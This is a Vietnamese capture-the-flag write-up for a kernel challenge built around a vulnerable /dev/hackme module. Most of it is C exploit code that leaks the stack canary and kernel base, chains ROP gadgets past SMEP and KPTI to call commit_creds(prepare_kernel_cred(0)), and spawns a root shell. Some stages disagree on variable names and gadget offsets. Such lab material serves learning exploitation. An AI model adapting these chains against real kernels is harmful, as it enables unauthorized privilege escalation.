# part1.1_bypass_smep

## setup

### run.sh

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -s \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"

```

### Phân tích

- ở 2 hàm `hackme_read` `hackme_write` mình đã phân tích ở part 1

### Khai thác

#### Leak base

- Ta thấy tmp[38] không bị ảnh hưởng bởi `FG-KASLR`

```c
long int canary = 0;
unsigned long pop_rax_ret;       // pop rax; ret
unsigned long read_mem_pop1_ret; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
unsigned long pop_rdi_rbp_ret;   // pop rdi; pop rbp; ret;
unsigned long ksymtab_prepare_kernel_cred;
unsigned long ksymtab_commit_creds;
void read_module()
{
    long int tmp[40];
    int check = read(fd_ko, tmp, sizeof(tmp));
    long int image_base = 0;
    image_base = tmp[38] - 0xa157ULL;
    canary = tmp[16];

    pop_rax_ret = image_base + 0x4d11UL;
    read_mem_pop1_ret = image_base + 0x4aaeUL;
    pop_rdi_rbp_ret = image_base + 0x38a0UL;
    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
    ksymtab_commit_creds = image_base + 0xf87d90UL;
    if (check < 0)
    {
        printf("read fail\n");
        exit(0);
    }
    for (int i = 0; i < 48; i++)
    {
        printf("hackme[%d]: %lp\n", i, tmp[i]);
    }
    printf("[*] Canary: 0x%lx\n", canary);
    printf("[*] Image base: 0x%lx\n", image_base);
}

```

#### STAGE 1: Leaking commit_creds()

- Do smep bật nên ta cần đổi page-table

```c
void stage_1(void);
void stage_2(void);
void stage_3(void);
void stage_4(void);
void get_commit_creds(void);

void stage_1(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak commit_creds()");
    ssize_t w = write(fd_ko, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_commit_creds(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)tmp_store;
    printf("    --> commit_creds: %lx\n", commit_creds);
    // stage_2();
}
```

#### STAGE 2: Leaking prepare_kernel_cred()

```c
void get_prepare_kernel_cred(void);
void stage_2(void)
{
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0;                                // rbx
    payload[off++] = 0x0;                                // r12
    payload[off++] = 0x0;                                // rbp
    payload[off++] = pop_rax_ret;                        // return address
    payload[off++] = ksymtab_prepare_kernel_cred - 0x10; // rax <- __ksymtabs_prepare_kernel_cred - 0x10
    payload[off++] = read_mem_pop1_ret;                  // rax <- [__ksymtabs_prepare_kernel_cred]
    payload[off++] = 0x0;                                // dummy rbp
    payload[off++] = kpti_trampoline;                    // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0;                                // dummy rax
    payload[off++] = 0x0;                                // dummy rdi
    payload[off++] = (unsigned long)get_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak prepare_kernel_cred()");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_prepare_kernel_cred(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;");
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
    // stage_3();
}
```

#### STAGE 3

```c
void after_prepare_kernel_cred(void);

void stage_3(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = 0; // rdi <- 0
    payload[off++] = 0; // dummy rbp
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)after_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call prepare_kernel_cred(0)");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void after_prepare_kernel_cred(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    returned_creds_struct = tmp_store;
    printf("    --> returned_creds_struct: %lx\n", returned_creds_struct);
    // stage_4();
}

```

#### STAGE 4:

```c
void get_shell(void);

void stage_4(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
    payload[off++] = 0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(returned_creds_struct)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_shell+1;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
    ssize_t w = write(fd_ko, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
```
#### full script
- script tham khảo
```c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void leak_stack(int, unsigned long *);
void save_state(void);
void fetch_commit(void);
void leak_prep(void);
void fetch_prep(void);
void make_cred(void);
void fetch_cred(void);
void send_cred(void);
void getshell(void);

int fetch;
int fd;

unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long commit_creds, prepare_kcred, ksymtab_commit_creds, ksymtab_prepare_kcred;
unsigned long canary, image_base;
unsigned long cred_struct_ptr;

//arbitrary read gadgets
unsigned long pop_rax; //pop rax ; ret
unsigned long mov_eax_pop; //mov eax, dword ptr [rax] ; pop rbp ; ret

//other gadgets
unsigned long kpti_trampoline; //followed by 2 pops
unsigned long pop_rdi;

int main(void)
{
	save_state();
	
	fd = open("/dev/hackme", O_RDWR);
	
	printf("[+]Leaking Stack...\n");
	int size = 50;
	unsigned long buf[size];
	leak_stack(size, buf);

	canary = buf[16];
	image_base = buf[38]-0xa157;

	printf("[+]Canary: %lx\n", canary);
	printf("[+]Image Base: %lx\n", image_base);


	pop_rax = image_base + 0x4d11;
	mov_eax_pop = image_base + 0x15a80;
	kpti_trampoline = image_base + 0x200f26;

	ksymtab_commit_creds = image_base + 0xf87d90;
	ksymtab_prepare_kcred = image_base + 0xf8d4fc;

	//leak commit_creds
	int offset = 16;
	unsigned long payload[50];
	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rax;
	payload[offset++] = ksymtab_commit_creds;
	payload[offset++] = mov_eax_pop;
	payload[offset++] = 0;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_commit;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	write(fd, payload, sizeof(payload));

	return 0;
}

void leak_stack(int size, unsigned long * buf)
{
	read(fd, buf, size*8);
	for (int i = 0; i < size; i++)
		printf("[%d]: %lx\n", i, buf[i]);
}

void save_state(void)
{
	__asm__
	(
	 	".intel_syntax noprefix;"
		
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"

		".att_syntax;"
	);
	printf("[+]State Saved!\n");
}

void fetch_commit(void)
{
	__asm__
	(
 		".intel_syntax noprefix;"

		"mov fetch, eax;"
		
		".att_syntax;"
	);
	commit_creds = ksymtab_commit_creds + fetch;
	printf("[+]commit_creds() Leaked: %lx\n", commit_creds);

	leak_prep();
}

void leak_prep(void)
{
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rax;
	payload[offset++] = ksymtab_prepare_kcred;
	payload[offset++] = mov_eax_pop;
	payload[offset++] = 0;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_prep;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	write(fd, payload, sizeof(payload));
}

void fetch_prep(void)
{
	__asm__
	(
		".intel_syntax noprefix;"
		
		"mov fetch, eax;"

		".att_syntax;"
	);
	prepare_kcred = ksymtab_prepare_kcred + fetch;
	printf("[+]prepare_kernel_cred() Leaked: %lx\n", prepare_kcred);

	make_cred();
}

void make_cred(void)
{
	unsigned long payload[50];
	int offset = 16;
	pop_rdi = image_base + 0x6370;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rdi;
	payload[offset++] = 0;
	payload[offset++] = prepare_kcred;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_cred;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	write(fd, payload, sizeof(payload));
}

void fetch_cred(void)
{
	__asm__
	(
	 	".intel_syntax noprefix;"
		
		"mov cred_struct_ptr, rax;"

		".att_syntax;"
	);
	printf("[+]ptr to cred struct retrieved: %lx\n", cred_struct_ptr);

	send_cred();
}

void send_cred(void)
{
	
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rdi;
	payload[offset++] = cred_struct_ptr;
	payload[offset++] = commit_creds;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)getshell;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	
	write(fd, payload, sizeof(payload));
}

void getshell(void)
{
	if (getuid() == 0)
	{
		printf("[+]Exploit Success!\n");
		system("/bin/sh");
	}
	else
		printf("[-]Exploit Unsuccessful.\n");
	exit(0);
}
```
- full script
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int fd_ko;
void open_module()
{
    fd_ko = open("/dev/hackme", O_RDWR);
    if (fd_ko < 0)
    {
        printf("open fail");
        exit(0);
    }
}
long int canary = 0;
void read_module()
{
    long int tmp[0x10 + 5];
    int check = read(fd_ko, tmp, sizeof(tmp));
    if (check < 0)
    {
        printf("read fail\n");
        exit(0);
    }
    for (int i = 0; i < 0x10 + 5; i++)
    {
        printf("hackme[%d]: %lp\n", i, tmp[i]);
    }
    canary = tmp[16];
}

void get_shell(void)
{
    puts("[*] Returned to userland");
    if (getuid() == 0)
    {
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    }
    else
    {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell + 1;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved state");
}

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rdx_ret = 0xffffffff81007616;              // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;     // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
unsigned long iretq = 0xffffffff8100c0d9;

void write_module(void)
{
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = canary;
    payload[off++] = 0x0;                 // rbx
    payload[off++] = 0x0;                 // r12
    payload[off++] = 0x0;                 // rbp
    payload[off++] = pop_rdi_ret;         // return address
    payload[off++] = 0x0;                 // rdi <- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdx_ret;
    payload[off++] = 0x8;                      // rdx <- 8
    payload[off++] = cmp_rdx_jne_pop2_ret;     // make sure JNE doesn't branch
    payload[off++] = 0x0;                      // dummy rbx
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
    payload[off++] = 0x0;                      // dummy rbx
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = commit_creds;             // commit_creds(prepare_kernel_cred(0))
    payload[off++] = swapgs_pop1_ret;          // swapgs
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = iretq;                    // iretq frame
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(fd_ko, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

int main()
{
    save_state();
    open_module();
    read_module();
    write_module();
}

```